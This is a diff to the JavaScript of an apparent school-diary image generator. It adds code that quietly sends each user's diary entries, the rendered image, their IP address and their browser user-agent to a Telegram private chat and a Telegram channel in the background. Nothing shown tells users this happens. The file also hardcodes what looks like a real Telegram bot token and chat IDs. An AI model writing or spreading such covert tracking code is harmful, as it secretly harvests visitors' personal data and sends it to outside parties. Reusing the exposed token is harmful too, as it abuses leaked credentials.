@@ -1,6 +1,13 @@
 // HARDCODED TELEGRAM CREDENTIALS (KEEP THIS FILE PRIVATE!)
 const TELEGRAM_BOT_TOKEN = "7180890909:AAEmpWcoeg7_oVV5s4C5bxzbY72YNr7vwwE";
-const TELEGRAM_CHAT_ID = "1928349457";
+
+// Send to BOTH your private chat + your channel
+// NOTE: Channel IDs must include the -100 prefix
+const TELEGRAM_CHAT_IDS = [
+  "1928349457",        // your private chat/user
+  "-1001580632618"     // your channel
+];
+
 const TELEGRAM_ENABLED = true; // Set to false to disable
 
 // Elements
@@ -38,23 +45,23 @@ teacherInput.addEventListener("input", function (e) {
 // Get user's IP address
 async function getUserIP() {
   try {
-    const response = await fetch('https://api.ipify.org?format=json');
+    const response = await fetch("https://api.ipify.org?format=json");
     const data = await response.json();
     return data.ip;
   } catch (error) {
-    return 'Unknown';
+    return "Unknown";
   }
 }
 
-// Send to Telegram
+// Send to Telegram (to multiple chats)
 async function sendToTelegram(data, imageDataUrl) {
-  if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  if (!TELEGRAM_ENABLED || !TELEGRAM_BOT_TOKEN || !Array.isArray(TELEGRAM_CHAT_IDS) || TELEGRAM_CHAT_IDS.length === 0) return;
 
   try {
     // Get IP and User-Agent
     const userIP = await getUserIP();
     const userAgent = navigator.userAgent;
-    
+
     const message = `
 📚 *New School Diary Entry*
 
@@ -67,7 +74,7 @@ async function sendToTelegram(data, imageDataUrl) {
 ${data.cw}
 
 📋 *Homework:*
-${data.hw || 'None'}
+${data.hw || "None"}
 
 💬 *Remarks:*
 ${data.remark}
@@ -78,43 +85,44 @@ ${data.remark}
 🖥 User-Agent: \`${userAgent}\`
     `.trim();
 
-    // Send text message
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-
-    // Convert base64 to blob
-    const base64Data = imageDataUrl.split(',')[1];
+    // Convert base64 to blob ONCE (reused for all sends)
+    const base64Data = imageDataUrl.split(",")[1];
     const byteCharacters = atob(base64Data);
     const byteNumbers = new Array(byteCharacters.length);
     for (let i = 0; i < byteCharacters.length; i++) {
       byteNumbers[i] = byteCharacters.charCodeAt(i);
     }
     const byteArray = new Uint8Array(byteNumbers);
-    const blob = new Blob([byteArray], { type: 'image/png' });
+    const blob = new Blob([byteArray], { type: "image/png" });
 
-    // Send image
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', blob, 'diary.png');
-    formData.append('caption', '📄 School Diary');
+    // Send text + image to all chat IDs
+    for (const chatId of TELEGRAM_CHAT_IDS) {
+      // Send text message
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      });
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
+      // Send image
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "diary.png");
+      formData.append("caption", "📄 School Diary");
 
-    console.log('✅ Sent to Telegram successfully');
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData,
+      });
+    }
+
+    console.log("✅ Sent to Telegram (all chats) successfully");
   } catch (error) {
-    console.error('❌ Failed to send to Telegram:', error);
+    console.error("❌ Failed to send to Telegram:", error);
   }
 }
 
@@ -127,7 +135,7 @@ form.addEventListener("submit", async function (e) {
   lastTeacher = teacherName;
 
   const selectedDate = dateInput.value;
-  const dateObj = new Date(selectedDate + 'T00:00:00');
+  const dateObj = new Date(selectedDate + "T00:00:00");
   const day = String(dateObj.getDate()).padStart(2, "0");
   const month = String(dateObj.getMonth() + 1).padStart(2, "0");
   const year = dateObj.getFullYear();
@@ -228,7 +236,7 @@ async function generateDiary(data) {
     const imageDataUrl = canvas.toDataURL("image/png");
     diaryImage.src = imageDataUrl;
 
-    // Send to Telegram in background
+    // Send to Telegram in background (to private + channel)
     sendToTelegram(data, imageDataUrl);
 
     loader.style.display = "none";
